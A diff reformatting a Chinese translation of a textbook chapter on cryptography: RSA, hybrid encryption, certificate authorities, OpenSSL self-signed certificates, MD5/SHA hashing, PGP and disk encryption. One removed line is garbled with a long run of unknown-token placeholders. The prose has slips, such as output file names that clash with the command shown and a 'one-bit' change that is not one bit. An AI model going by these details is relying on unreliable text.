+公钥加密使用公钥对消息进行加密，只有私钥才能解密。私钥是唯一需要保护的密钥，因为它仅用于解密使用对应公钥加密的消息。如果想与他人交换加密消息，你应提供你的公钥，而他们应提供自己的公钥。发送这些公钥本身并不存在危险或风险，它们只能用于与相应的私钥配合使用。攻击者不可能仅凭同一公钥解密别人的消息。公钥的工作方式并非如此。
 
-    ### 非对称密钥加密
+公钥加密的一个常见算法是 RSA（Rivest‑Shamir‑Adleman）。RSA 使用基于一对大质数的密钥。RSA 可使用的密钥长度为 `1,024` 位、`2,048` 位和 `4,096` 位。这里凸显了不同算法之间的关键强度不可直接比较。非对称算法的行为截然不同。仅凭 AES 使用 128 位而 RSA 使用 1,024 位，不能直接断言 RSA 强度是 AES 的数量级。两者差异巨大，关键长度无法直接比较。唯一可比较的结论是：RSA 2,048 位密钥明显强于 RSA 1,024 位密钥，正如 AES 256 位密钥明显强于 AES 128 位密钥。
 
-    对称密钥加密使用同一密钥进行加密和解密，而非对称密钥加密则使用两把密钥。因此，非对称密钥加密也称为 `公钥加密`。其中一把是公钥，另一把是私钥。这两把密钥在数学上相互关联，使得用一把加密的内容可以用另一把解密。这解决了在双方之间传递密钥的问题。如果有两把密钥，只需保护其中一把，另一把可以安全传输。事实上，公钥本身就是公开的，只有拥有公钥的人才能使用它。
+### 混合加密系统
 
-    公钥加密使用公钥对消息进行加密，只有私钥才能解密。私钥是唯一需要保护的密钥，因为它仅用于解密使用对应公钥加密的消息。如果想与他人交换加密消息，你应提供你的公钥，而他们应提供自己的公钥。发送这些公钥本身并不存在危险或风险，它们只能用于与相应的私钥配合使用。攻击者不可能仅凭同一公钥解密别人的消息。公钥的工作方式并非如此。
+你可能会好奇为何会有对称和非对称两种算法。为何不只使用一种？虽然无法直接比较对称和非对称，但非对称密钥长度更大，若攻击基于暴力破解，破解 1,024 位密钥所需时间远超破解 128 位密钥，因为密钥空间有许多数量级的差异。那么为何不在所有场景中使用非对称密钥加密？
 
-    公钥加密的一个常见算法是 RSA（Rivest‑Shamir‑Adleman）。RSA 使用基于一对大质数的密钥。RSA 可使用的密钥长度为 `1,024` 位、`2,048` 位和 `4,096` 位。这里凸显了不同算法之间的关键强度不可直接比较。非对称算法的行为截然不同。仅凭 AES 使用 128 位而 RSA 使用 1,024 位，不能直接断言 RSA 强度是 AES 的数量级。两者差异巨大，关键长度无法直接比较。唯一可比较的结论是：RSA 2,048 位密钥明显强于 RSA 1,024 位密钥，正如 AES 256 位密钥明显强于 AES 128 位密钥。
-
-    ### 混合加密系统
-
-    你可能会好奇为何会有对称和非对称两种算法。为何不只使用一种？虽然无法直接比较对称和非对称，但非对称密钥长度更大，若攻击基于暴力破解，破解 1,024 位密钥所需时间远超破解 128 位密钥，因为密钥空间有许多数量级的差异。那么为何不在所有场景中使用非对称密钥加密？
-
-    首先，非对称密钥加密在计算上代价高昂，速度较慢，因为密钥体积大。虽然现代计算机速度快，但使用更大的密钥仍会带来更多计算开销。其次，公钥加密需要大量的密钥管理开销。如果在所有情况下都使用公钥加密，每个人都需要拥有密钥，这在实际操作中极不实际。稍后在讨论密钥管理和证书颁发机构时会进一步说明。
-
-
+首先，非对称密钥加密在计算上代价高昂，速度较慢，因为密钥体积大。虽然现代计算机速度快，但使用更大的密钥仍会带来更多计算开销。其次，公钥加密需要大量的密钥管理开销。如果在所有情况下都使用公钥加密，每个人都需要拥有密钥，这在实际操作中极不实际。稍后在讨论密钥管理和证书颁发机构时会进一步说明。
 
 然而，当涉及对称密钥加密时，我们仍然面临密钥交换的问题。可以使用非对称密钥加密来解决这一问题。我们通过结合使用公钥和对称密钥加密来实现这一点。这种方法被称为混合密码系统。公钥可以用于保护对称密钥，从而避免任何人获取该对称密钥。此时的对称密钥有时被称为 `会话密钥`，因为它用于在两个系统之间的会话中加密数据。这种混合密码系统最常用于与 Web 服务器进行通信。
 
@@ -11382,9 +12440,10 @@ DES 的替代算法是高级加密标准（AES）。正如 Lucifer 用于创建 
 
 椭圆曲线可以通过绘制多项式函数的图形来直观理解。例如，如 Figure 13.4 所示，函数 `y2 = x3 – x + 1` 的图形就是一个椭圆曲线的示例。对数是指数运算的逆运算，而离散对数是指使一个数值通过将另一个数值相乘得到目标值的指数。简单来说，它是索引。例如，若 `bk = a`，则 `k` 即为离散对数。因此，你选择曲线上的一个点，并求出对应的 `k` 值，这就是在 ECC 中使用的值。
 
-```
+
+
+
 ![FIGURE 13.4 Elliptic curve](img/c13f004.png)
-```
 
 **FIGURE 13.4** 椭圆曲线
 
@@ -11396,10 +12455,9 @@ DES 的替代算法是高级加密标准（AES）。正如 Lucifer 用于创建 
 
 ### 证书颁发机构与密钥管理
 
-密钥是密码学的基石。没有密钥，我们就无法逆转加密过程。将可读文本转换为不可读内容很容易，而能够逆转的转换则是复<unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk> [content]...
+密钥是密码学的基石。没有密钥，我们就无法逆转加密过程。将可读文本转换为不可读内容很容易，而能够逆转的转换则是复杂的。
 
-
--   [证书颁发机构 (CA)](https://example.org) 是一个证书库。它向用户颁发证书，这意味着它收集用户的信息，然后生成密钥提供给用户。证书存储在权威机构中，同时也提供给用户。当然，有人需要管理证书库。CA 及相关系统称为 `public key infrastructure` (PKI)。拥有这样一个库的公司有时被称为 `证书颁发机构`，因为它是管理证书的权威。有时软件本身被称为 `权威`。这正是 `SimpleAuthority` 这个软件的情况。该软件使用 `OpenSSL` 库和工具生成证书，并通过图形界面处理证书的存储、创建和管理。Figure 13.5 展示了创建证书颁发机构的过程，即创建根证书和证书库，使用 Simple Authority。根证书是所有 CA 中其他证书所依赖的签名证书。
+证书颁发机构 (CA) 是一个证书库。它向用户颁发证书，这意味着它收集用户的信息，然后生成密钥提供给用户。证书存储在权威机构中，同时也提供给用户。当然，有人需要管理证书库。CA 及相关系统称为 `public key infrastructure` (PKI)。拥有这样一个库的公司有时被称为 `证书颁发机构`，因为它是管理证书的权威。有时软件本身被称为 `权威`。这正是 `SimpleAuthority` 这个软件的情况。该软件使用 `OpenSSL` 库和工具生成证书，并通过图形界面处理证书的存储、创建和管理。Figure 13.5 展示了创建证书颁发机构的过程，即创建根证书和证书库，使用 Simple Authority。根证书是所有 CA 中其他证书所依赖的签名证书。
 
 ![FIGURE 13.5 Simple Authority CA creation](img/c13f005.png)
 
@@ -11437,9 +12495,7 @@ DES 的替代算法是高级加密标准（AES）。正如 Lucifer 用于创建 
 
 **FIGURE 13.8** Certificate error
 
-
-
--   [Google Chrome](https://www.google.com) 为何生成此错误？因为证书上的名称与服务器的名称不匹配。Web 服务器的主机名是 `www.sofamart.com`。注册证书时，需要提供该名称，包括安装证书的服务器主机名。两者必须一致。在此案例中，证书是颁发给 `*.furniturerow.com` 的，这说明即使证书来自受信任的权威机构，也不能保证你正在连接的服务器可信，因为证书可能被复制并安装在其他位置。这里，Furniture Row 是 Sofa Mart 的所有者公司，为了节省成本，尝试在其所有服务器上共用同一张证书。
+Google Chrome 为何生成此错误？因为证书上的名称与服务器的名称不匹配。Web 服务器的主机名是 `www.sofamart.com`。注册证书时，需要提供该名称，包括安装证书的服务器主机名。两者必须一致。在此案例中，证书是颁发给 `*.furniturerow.com` 的，这说明即使证书来自受信任的权威机构，也不能保证你正在连接的服务器可信，因为证书可能被复制并安装在其他位置。这里，Furniture Row 是 Sofa Mart 的所有者公司，为了节省成本，尝试在其所有服务器上共用同一张证书。
 
 ### Self‑Signed Certificates
 
@@ -11448,8 +12504,7 @@ DES 的替代算法是高级加密标准（AES）。正如 Lucifer 用于创建 
 **Certificate Generation**
 
 ```
-root@quiche:~# openssl req -x509 -newkey rsa:4096 -keyout key.pem
--out cert.pem -days 365
+root@quiche:~# openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365
 Generating a RSA private key
  …………………………………………++++
  …………………………………………………………………………………………………………………………..++++
@@ -11457,7 +12512,7 @@ Generating a RSA private key
  Enter PEM pass phrase:
  Verifying - Enter PEM pass phrase:
  -----
- You are about to be asked to enter information that will be incorporated <![CDATA[into your certificate request.
+ You are about to be asked to enter information that will be incorporated into your certificate request.
  What you are about to enter is what is called a Distinguished Name or a DN.
  There are quite a few fields but you can leave some blank
  For some fields there will be a default value,
@@ -11470,7 +12525,6 @@ Generating a RSA private key
  Organizational Unit Name (eg, section) []:IT
  Common Name (e.g. server FQDN or YOUR name) []:www.server.com
  Email Address []:wubble@wubble.com
-          
 ```
 
 我使用 `openssl` 命令发起 X.509 证书请求，这在命令行的第一部分完成。随后，我提供将嵌入证书中的密钥信息。该密钥是 4,096 位的 RSA 密钥。密钥写入 `key.out` 文件，而证书本身写入 `key.pem`。还需要指定证书的有效期。你可能会遇到证书过期的情况，即旧证书仍在使用。浏览器可能会阻止与过期证书的服务器建立连接。你可以在此处指定任何期限。命令行中请求的期限是 365 天。你可能注意到，当我创建自己的 CA 时，根证书的有效期为 10 年。你不希望每年都更新根证书，因为这会导致许多用户拥有过期的根证书，从而使得该 CA 签发的所有证书都失效。再次出现递归属性的作用。
@@ -11491,64 +12545,75 @@ Certificate:
 OU = IT, CN = www.server.com, emailAddress = wubble@wubble.com
         Validity
             Not Before: Jan 20 22:13:54 2019 GMT
-            Not After : Jan 20 22:13:54 2020 GMT
-        Subject: C = US, ST = CO, L = Wubble, O = Internet Widgits Pty Ltd,
+```
+
+
+
+Not After : Jan 20 22:13:54 2020 GMT
+
+Subject: C = US, ST = CO, L = Wubble, O = Internet Widgits Pty Ltd,
+
 OU = IT, CN = www.server.com, emailAddress = wubble@wubble.com
-        Subject Public Key Info:
-            Public Key Algorithm: rsaEncryption
-                RSA Public-Key: (4096 bit)
+
+Subject Public Key Info:
+
+Public Key Algorithm: rsaEncryption
+
+RSA Public-Key: (4096 bit)
+
 ```
 
 下面你可以看到证书中包含的大量细节。首先是证书版本号，指示 X.509 证书的版本，这决定了证书包含的功能。还有证书序列号，唯一标识证书。我们还可以看到颁发者信息，通常是 CA。在此例中，颁发者和主体相同，因为没有权威机构，这是一张自签名证书，即生成该证书的设备自己对其签名。
 
 上述文本输出缺少指纹信息。完整的文本输出还包含模数（即两个大质数的乘积），这是密钥的一部分。最后，还会出现证书的 Base64 编码表示。证书中存储大量数据，打印全部需要较大空间，但这能让你了解证书捕获和使用所需的信息。
 
-**Cryptographic Hashing**
+## Cryptographic Hashing
 
-加密学的一个重要元素我们此前略过了。你可能在本章节前面看到过它，例如在自签名证书中，或在 Web 服务器使用的密码套件里。缺失的关键是数据验证。你可以加密数据，但应当确保发送的内容就是接收到的内容，防止被篡改。这可以通过消息验证码（MAC）实现。MAC 是一个固定长度的值，由对整条消息运行的加密算法生成。输出通常称为 *hash*，它可以用于多种目的，不仅仅是验证传输的消息。
+加密学的一个重要元素我们此前略过了。你可能在本章节前面看到过它，例如在自签名证书中，或在 Web 服务器使用的密码套件里。缺失的关键是数据验证。你可以加密数据，但应当确保发送的内容就是接收到的内容，防止被篡改。这可以通过消息验证码（MAC）实现。MAC 是一个固定长度的值，由对整条消息运行的加密算法生成。输出通常称为 `hash`，它可以用于多种目的，不仅仅是验证传输的消息。
 
-常见的哈希函数 —  — 虽然正逐步被弃用 —  — 是 Message Digest 5（MD5）。MD5 是一种加密算法，接受任意长度输入并生成固定长度输出。生成 MD5 哈希会得到 32 个十六进制字符，即 128 位。对于加密哈希函数，它并非线性函数，这意味着即使只改变一个比特，也会产生完全不同的值。下面的代码示例展示了我如何使用 `md5sum` 命令对字符串 `‘123456789’` 生成 MD5 哈希，以及对字符串 `‘223456789'（只差一个比特）` 生成的哈希，两者的输出截然不同，毫无关联。
+常见的哈希函数 — — 虽然正逐步被弃用 — — 是 Message Digest 5（MD5）。MD5 是一种加密算法，接受任意长度输入并生成固定长度输出。生成 MD5 哈希会得到 32 个十六进制字符，即 128 位。对于加密哈希函数，它并非线性函数，这意味着即使只改变一个比特，也会产生完全不同的值。下面的代码示例展示了我如何使用 `md5sum` 命令对字符串 `‘123456789’` 生成 MD5 哈希，以及对字符串 `‘223456789'（只差一个比特）` 生成的哈希，两者的输出截然不同，毫无关联。
 
-**Generating an MD5 Hash**
+## Generating an MD5 Hash
 
 ```
 root@quiche:~# echo '123456789' | md5sum
+
 b2cfa4183267af678ea06c7407d4d6d8  -
+
 root@quiche:~# echo '223456789' | md5sum
+
 2cad6f3fd5e54b84cfccd3e1ef5aea4d  -
-```
-
-
-
-一个加密哈希的期望是每个输入集合都会产生不同的值。当两个不同的输入集合生成相同的输出值时，这称为`collision`。这些碰撞，特别是如果它们可以被人为制造，可能会导致被利用。由于这些值用于验证消息，如果消息摘要输出可以通过碰撞被操纵，则消息可能被篡改，而摘要值仍保持不变。
-
-MD5 并不是唯一用于加密哈希的算法。事实上，它已经被 **Secure Hash Algorithm 1 (SHA‑1)** 所取代。它提供 160 位（20 字节）的输出，以 40 位十六进制数字表示。SHA‑1 与 MD5 同样如此。输入集合中的单个位差异会导致两组完全不相关的输出。你可以通过使用与 MD5 哈希示例相同的演示来看到这一点。
-
-`Hash Values with SHA-1`
 
 ```
+
+一个加密哈希的期望是每个输入集合都会产生不同的值。当两个不同的输入集合生成相同的输出值时，这称为 `collision`。这些碰撞，特别是如果它们可以被人为制造，可能会导致被利用。由于这些值用于验证消息，如果消息摘要输出可以通过碰撞被操纵，则消息可能被篡改，而摘要值仍保持不变。
+
+MD5 并不是唯一用于加密哈希的算法。事实上，它已经被 `Secure Hash Algorithm 1 (SHA‑1)` 所取代。它提供 160 位（20 字节）的输出，以 40 位十六进制数字表示。SHA‑1 与 MD5 同样如此。输入集合中的单个位差异会导致两组完全不相关的输出。你可以通过使用与 MD5 哈希示例相同的演示来看到这一点。
+
+## Hash Values with SHA-1
+
 ```
 root@quiche:~# echo '123456789' | sha1sum
-`179c94cf45c6e383baf52621687305204cef16f9`  -
+179c94cf45c6e383baf52621687305204cef16f9  -
 root@quiche:~# echo '223456789' | sha1sum
-`884228b47dd406b235d020315929a8841f178a93`  -
+884228b47dd406b235d020315929a8841f178a93  -
 ```
 
 这些哈希函数可以用于验证消息，因为哈希随消息一起传输。如果消息有任何差异，则应视为不真实，并应丢弃，因为假设它已被篡改。因此，不能操纵消息摘要至关重要。一旦攻击者能够篡改消息但仍使摘要正确，他们就可以更改被认为是私密的加密消息。
 
-SHA‑1 并非终点。目前有 **SHA‑2**，支持四种不同的摘要大小（位长），分别为 224、256、384 和 512 位。还有 **SHA‑3**，它支持与 SHA‑2 相同的长度，但内部实现不同于 SHA‑1 和 SHA‑2。由于 SHA‑2 支持最高 512 位的摘要长度，实际上没有理由不使用它而不是 SHA‑1 或 MD5。它对碰撞的防护更强，且计算时间并未因更大的密钥空间而显著增加。
+SHA‑1 并非终点。目前有 `SHA‑2`，支持四种不同的摘要大小（位长），分别为 224、256、384 和 512 位。还有 `SHA‑3`，它支持与 SHA‑2 相同的长度，但内部实现不同于 SHA‑1 和 SHA‑2。由于 SHA‑2 支持最高 512 位的摘要长度，实际上没有理由不使用它而不是 SHA‑1 或 MD5。它对碰撞的防护更强，且计算时间并未因更大的密钥空间而显著增加。
 
 除了提供消息验证外，加密哈希还用于验证数据的正确性，常见于从网站下载文件时的校验。下载文件时，可以计算下载文件的哈希值并与预期值进行比较。这种方式不保证文件的真实性，即在下载过程中篡改的风险很低。它主要用于检测下载过程中的损坏。但也要确保网站上提供的文件实际上是预期的文件；当文件系统中的文件被修改时，网站也需要同步更新。
 
-加密哈希常用于文件完整性系统，如 **Tripwire**。系统中的关键文件会计算并存储其哈希值。软件会定期比较文件系统中的实际内容与已知的良好数据库。如果发现变化，则可能提示系统被 compromise。基于主机的入侵检测系统也常使用这种机制，以便在攻击者获取系统时及时发现。
+加密哈希常用于文件完整性系统，如 `Tripwire`。系统中的关键文件会计算并存储其哈希值。软件会定期比较文件系统中的实际内容与已知的良好数据库。如果发现变化，则可能提示系统被 `compromise`。基于主机的入侵检测系统也常使用这种机制，以便在攻击者获取系统时及时发现。
 
 ## PGP 和 S/MIME
 
-公钥加密在多种场景中被广泛使用。但不一定依赖于 **CA**（证书颁发机构）。并非所有人都接受集中化的管理模式，即组织被信任。1990 年代，Phil Zimmermann 开发了一种不依赖 CA 的证书管理方式 —  — **Pretty Good Privacy (PGP)**，它采用“密码学信任网络”进行验证。思路是将密钥上传到公共服务器，了解上传者的人会为该密钥签名，以示他们认识该人并确认该密钥确实属于声称的用户。
+公钥加密在多种场景中被广泛使用。但不一定依赖于 `CA`（证书颁发机构）。并非所有人都接受集中化的管理模式，即组织被信任。1990 年代，Phil Zimmermann 开发了一种不依赖 CA 的证书管理方式 — — `Pretty Good Privacy (PGP)`，它采用“密码学信任网络”进行验证。思路是将密钥上传到公共服务器，了解上传者的人会为该密钥签名，以示他们认识该人并确认该密钥确实属于声称的用户。
 
 假设 Zoey 的邮箱地址是 `zoey@wubble.com`，她上传了自己的 PGP 密钥。此过程基于创建 X.509 证书并将公钥存放在公共服务器上。正是公钥被存储在公共服务器中。我认识 Zoey，知道她的邮箱地址，并且她告诉我她的公钥指纹。我前往 PGP 密钥站点并用我的签名对她的密钥进行签署。任何了解我但不认识 Zoey 的人都可以确信 Zoey 的密钥是可信的。这再次体现了传递属性：你信任我，而我信任 Zoey 的密钥是可靠的，因此你可以信任 Zoey 的密钥，并使用她的公钥发送加密消息。
 
-你最终需要管理所有想与之通信的公钥，通常将它们存放在 **keyring** 中。keyring 通常由你自己的密钥签名，并附带消息验证码，以确保其未被篡改。正如你已经多次看到的，在谈论加密和隐私时，确保流程的每个环节的有效性以及保护密钥至关重要。PGP 的一个缺点是密钥由用户自行管理。这意味着你必须随时保管好自己的密钥。理论上我可能拥有一个 30 年旧的 PGP 密钥，但不幸的是，我不得不重新构建系统或密钥被误删。
+你最终需要管理所有想与之通信的公钥，通常将它们存放在 `keyring` 中。keyring 通常由你自己的密钥签名，并附带消息验证码，以确保其未被篡改。正如你已经多次看到的，在谈论加密和隐私时，确保流程的每个环节的有效性以及保护密钥至关重要。PGP 的一个缺点是密钥由用户自行管理。这意味着你必须随时保管好自己的密钥。理论上我可能拥有一个 30 年旧的 PGP 密钥，但不幸的是，我不得不重新构建系统或密钥被误删。
 
 这导致我不得不不断重新创建密钥，这在 Figure 13.9 中可见，同一电子邮件地址可能对应多个密钥。此时你如何确定应使用哪一个密钥来加密给该用户的消息？这把所有管理权都交到了个人用户手中。用户必须知道想要发送消息的对象，并选择对应的正确密钥。
 
@@ -11558,38 +12623,35 @@ SHA‑1 并非终点。目前有 **SHA‑2**，支持四种不同的摘要大小
 
 PGP 不适合用于服务器证书，而是用于用户之间的电子邮件等消息传递。只要双方都运行 PGP 软件，PGP 即可加密一封电子邮件。PGP 并非唯一的电子邮件加密方案。
 
-**Secure/Multipurpose Internet Mail Extensions (S/MIME)** 是另一种用于发送加密电子邮件的标准。它通常被嵌入到电子邮件客户端中，无需第三方软件。S/MIME 使用 **X.509** 证书，这些证书通常由证书颁发机构（CA）签发，并且常见于 Windows Active Directory 中安装。在完全基于 Microsoft 的环境中，企业内部的用户可以相互发送加密消息，并且公钥可以从 Active Directory 服务器中获取。这意味着不需要额外的根 CA 密钥，也不必采用其他方式将公钥分发到客户端系统。
+`Secure/Multipurpose Internet Mail Extensions (S/MIME)` 是另一种用于发送加密电子邮件的标准。它通常被嵌入到电子邮件客户端中，无需第三方软件。S/MIME 使用 `X.509` 证书，这些证书通常由证书颁发机构（CA）签发，并且常见于 Windows Active Directory 中安装。在完全基于 Microsoft 的环境中，企业内部的用户可以相互发送加密消息，并且公钥可以从 Active Directory 服务器中获取。这意味着不需要额外的根 CA 密钥，也不必采用其他方式将公钥分发到客户端系统。
 
 ## 磁盘和文件加密
 
+从数据安全的角度来看，数据分为三种类型。第一种是 `正在传输的数据`，我们在讨论使用 S/MIME 和混合加密系统时已经涉及此类。这些是用于加密正在从一个位置传输到另一个位置的数据的技术，通常是通过网络进行的。数据从发送方传输到接收方，因此被称为“正在传输”。第二种数据类型是 `正在使用的数据`，即由应用程序处理的数据，通常位于内存中。这种数据在安全方面更难以应对，因为它在使用过程中通常无法加密。相反，数据会在一段时间内以明文形式存在，这很有问题。开发人员可能会使用诸如 `数据掩盖` 等技术，这是一种保持数据可用但将其分段的方法，以便同一时间不能查看所有数据。
 
+第三种数据类型是 `静止数据`。这是存储在磁盘或磁带等介质上的数据。即使是已备份的数据也需要得到保护，因此应考虑对备份进行加密。不过，最常见的静止数据处理方式是文件级或磁盘级加密。文件级加密可以由许多实用程序处理。例如，在 macOS 系统中，Preview 可以加密文件。Figure 13.10 展示了在导出 PDF 时勾选“Encrypt File”选项后出现的对话框。要加密文件，需要一个密码作为加密密钥。
 
-
-从数据安全的角度来看，数据分为三种类型。第一种是**正在传输的数据**，我们在讨论使用 S/MIME 和混合加密系统时已经涉及此类。这些是用于加密正在从一个位置传输到另一个位置的数据的技术，通常是通过网络进行的。数据从发送方传输到接收方，因此被称为“正在传输”。第二种数据类型是**正在使用的数据**，即由应用程序处理的数据，通常位于内存中。这种数据在安全方面更难以应对，因为它在使用过程中通常无法加密。相反，数据会在一段时间内以明文形式存在，这很有问题。开发人员可能会使用诸如**数据掩盖**等技术，这是一种保持数据可用但将其分段的方法，以便同一时间不能查看所有数据。
-
-第三种数据类型是**静止数据**。这是存储在磁盘或磁带等介质上的数据。即使是已备份的数据也需要得到保护，因此应考虑对备份进行加密。不过，最常见的静止数据处理方式是文件级或磁盘级加密。文件级加密可以由许多实用程序处理。例如，在 macOS 系统中，Preview 可以加密文件。Figure 13.10 展示了在导出 PDF 时勾选“Encrypt File”选项后出现的对话框。要加密文件，需要一个密码作为加密密钥。
-
-像 PGP（前文已讨论）等其他实用程序也可以加密文件以及文件系统。加密文件系统的良好做法是使用操作系统自带的加密功能。你会在所有主要操作系统中发现内置加密功能。在此级别的加密中，它位于操作系统的底层，采用**全盘加密**，在系统启动前需要提供身份验证来解锁密钥。许多硬件系统包含所谓的**可信平台模块 (TPM)**，这是一种芯片上的加密处理器，能够执行诸如存储用于解密文件系统的密钥等任务。该密钥受到强力保护，只有正确的身份验证才能解锁该密钥。TPM 通常出现在运行 Windows 的系统中。Apple 也开发了自己的安全模块，功能类似。
+像 `PGP`（前文已讨论）等其他实用程序也可以加密文件以及文件系统。加密文件系统的良好做法是使用操作系统自带的加密功能。你会在所有主要操作系统中发现内置加密功能。在此级别的加密中，它位于操作系统的底层，采用 `全盘加密`，在系统启动前需要提供身份验证来解锁密钥。许多硬件系统包含所谓的 `可信平台模块 (TPM)`，这是一种芯片上的加密处理器，能够执行诸如存储用于解密文件系统的密钥等任务。该密钥受到强力保护，只有正确的身份验证才能解锁该密钥。TPM 通常出现在运行 Windows 的系统中。Apple 也开发了自己的安全模块，功能类似。
 
 ![FIGURE 13.10 Encrypting a PDF on macOS](img/c13f010.png)
 
 **FIGURE 13.10** Encrypting a PDF on macOS
 
-Apple 使用内置的全盘加密实用程序 **FileVault**。它内置于操作系统中，使用 AES 加密卷。你可以在系统偏好设置的“隐私与安全”选项中访问 FileVault。Figure 13.11 展示了系统设置工具，其中 FileVault 已启用，并需要管理员密码才能开启。启用 FileVault 后，你需要在系统启动前进行身份验证。此外，启用 FileVault 时会得到一个备份解密密钥。务必将其存储在加密卷之外的安全位置。如果忘记用于解锁驱动器的账户密码，存储在该驱动器上的密钥帮助不大。与任何解密密钥一样，必须对其进行保护。如果密钥被他人获取，可用于解密驱动器，这基本上等同于没有进行加密。
+Apple 使用内置的全盘加密实用程序 `FileVault`。它内置于操作系统中，使用 AES 加密卷。你可以在系统偏好设置的“隐私与安全”选项中访问 FileVault。Figure 13.11 展示了系统设置工具，其中 FileVault 已启用，并需要管理员密码才能开启。启用 FileVault 后，你需要在系统启动前进行身份验证。此外，启用 FileVault 时会得到一个备份解密密钥。务必将其存储在加密卷之外的安全位置。如果忘记用于解锁驱动器的账户密码，存储在该驱动器上的密钥帮助不大。与任何解密密钥一样，必须对其进行保护。如果密钥被他人获取，可用于解密驱动器，这基本上等同于没有进行加密。
 
 ![FIGURE 13.11 FileVault encryption](img/c13f011.png)
 
 **FIGURE 13.11** FileVault encryption
 
-Windows 也内置了加密软件，称为 **BitLocker**。在 Windows 系统的“更新和安全”设置中可以访问它。Figure 13.12 展示了控制面板页面，上面显示了 BitLocker 设置。启用 BitLocker 时，会询问如何存储解密密钥。如果硬件中有 TPM 芯片，密钥会存储在 TPM 中，但这只是主密钥。你仍需处理备份密钥。在 Windows 网络中，通常会有 Active Directory 服务器。备份密钥可以在 Active Directory 中进行保管，从而提供一个中心位置来检索密钥。对于企业而言，员工离职后，取走可以解锁驱动器的密码，Active Directory 中保存的密钥允许企业在需要时检索关键信息。即使密钥在员工离职后被取走，也有办法在之后恢复。
+Windows 也内置了加密软件，称为 `BitLocker`。在 Windows 系统的“更新和安全”设置中可以访问它。Figure 13.12 展示了控制面板页面，上面显示了 BitLocker 设置。启用 BitLocker 时，会询问如何存储解密密钥。如果硬件中有 TPM 芯片，密钥会存储在 TPM 中，但这只是主密钥。你仍需处理备份密钥。在 Windows 网络中，通常会有 Active Directory 服务器。备份密钥可以在 Active Directory 中进行保管，从而提供一个中心位置来检索密钥。对于企业而言，员工离职后，取走可以解锁驱动器的密码，Active Directory 中保存的密钥允许企业在需要时检索关键信息。即使密钥在员工离职后被取走，也有办法在之后恢复。
 
 ![FIGURE 13.12 BitLocker control panel](img/c13f012.png)
 
 **FIGURE 13.12** BitLocker control panel
 
-别忘了 Linux。Linux 系统上的加密经历了多次迭代，当前使用的是 `dm-crypt`，它位于 Linux 内核内。这个过程比仅仅打开选项并启用要稍微复杂一些。但 `dm-crypt` 也能够相对容易地加密外部卷。以下是在这类 Linux 系统上加密外部卷的步骤。过程从为 USB 驱动器创建一个卷开始。我们首先需要在驱动器上添加 **Linux Unified Key Setup (LUKS)** 头。这需要一个密码来保护密钥，进而保护驱动器上的数据。加密卷创建完成后，必须先使用 `cryptsetup open` 打开该卷，然后才能进行操作。
+别忘了 Linux。Linux 系统上的加密经历了多次迭代，当前使用的是 `dm-crypt`，它位于 Linux 内核内。这个过程比仅仅打开选项并启用要稍微复杂一些。但 `dm-crypt` 也能够相对容易地加密外部卷。以下是在这类 Linux 系统上加密外部卷的步骤。过程从为 USB 驱动器创建一个卷开始。我们首先需要在驱动器上添加 `Linux Unified Key Setup (LUKS)` 头。这需要一个密码来保护密钥，进而保护驱动器上的数据。加密卷创建完成后，必须先使用 `cryptsetup open` 打开该卷，然后才能进行操作。
 
-**在 Linux 中加密磁盘**
+## 在 Linux 中加密磁盘
 
 ```
 kilroy@hodgepodge $ sudo cryptsetup luksFormat /dev/sdf1
@@ -11620,231 +12682,167 @@ Writing superblocks and file system accounting information: done
 
